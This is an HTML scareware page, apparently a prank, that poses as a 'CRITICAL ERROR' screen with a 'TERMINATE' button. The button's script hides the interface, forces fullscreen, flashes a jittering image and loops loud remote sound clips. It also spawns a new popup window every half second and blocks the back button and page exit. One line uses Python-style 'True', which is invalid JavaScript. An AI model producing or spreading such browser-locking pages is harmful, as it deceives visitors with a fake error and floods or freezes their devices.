<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>☠️ SYSTEM_HALT ☠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        
        #madImg { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            object-fit: cover; z-index: 9999; display: none;
        }

        #ui { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #000; z-index: 10000; display: flex; 
            flex-direction: column; justify-content: center; align-items: center;
            font-family: monospace; color: #f00;
        }
        .btn-red { 
            background: #f00; color: #000; border: none; width: 280px; height: 100px;
            font-weight: bold; font-size: 28px; cursor: pointer;
            box-shadow: 0 0 30px #f00;
        }

        @keyframes jitter {
            0% { transform: translate(0,0) scale(1); }
            25% { transform: translate(-15px, 15px) rotate(-5deg) scale(1.2); }
            50% { transform: translate(20px, -10px) rotate(5deg) scale(1.1); }
            75% { transform: translate(-10px, -20px) rotate(-3deg) scale(1.3); }
            100% { transform: translate(0,0) scale(1.2); }
        }

        .active-madness {
            display: block !important;
            animation: jitter 0.05s infinite linear;
        }
    </style>
</head>
<body>

    <div id="ui">
        <h1 style="font-size: 40px;">☠️ CRITICAL ERROR ☠️</h1>
        <button class="btn-red" onclick="igniteGlobalAttack()">TERMINATE</button>
    </div>

    <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <script>
        function igniteGlobalAttack() {
            // 1. إخفاء الواجهة فوراً سواسوة
            document.getElementById('ui').style.removeProperty('display');
            document.getElementById('ui').style.display = 'none';
            document.getElementById('madImg').classList.add('active-madness');

            // 2. طلب الفول سكرين "بسيف" سواسوة
            let elem = document.documentElement;
            if (elem.requestFullscreen) elem.requestFullscreen();
            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();

            // 3. تشغيل الأصوات الـ 3 (Hoova, Chicken, Dzonza) سواسوة
            const links = [
                "https://www.myinstants.com/media/sounds/hoova-2.mp3",
                "https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3",
                "https://www.myinstants.com/media/sounds/dzonza.mp3"
            ];

            links.forEach(link => {
                let a = new Audio(link);
                a.loop = True;
                a.volume = 1.0;
                a.play();
                
                // ميزة البقاء في الخلفية سواسوة: نستخدم Picture-in-Picture وهمي أو تكرار الطلب
                a.onended = () => a.play();
            });

            // 4. منع الخروج (Loop Back) سواسوة
            setInterval(() => {
                window.open(window.location.href, '_blank', 'width=10,height=10');
            }, 500);
        }

        // منع زر الرجوع سواسوة
        window.onbeforeunload = function() { return "STAY"; };
        history.pushState(null, null, location.href);
        window.onpopstate = function() { history.go(1); };
    </script>
</body>
</html>
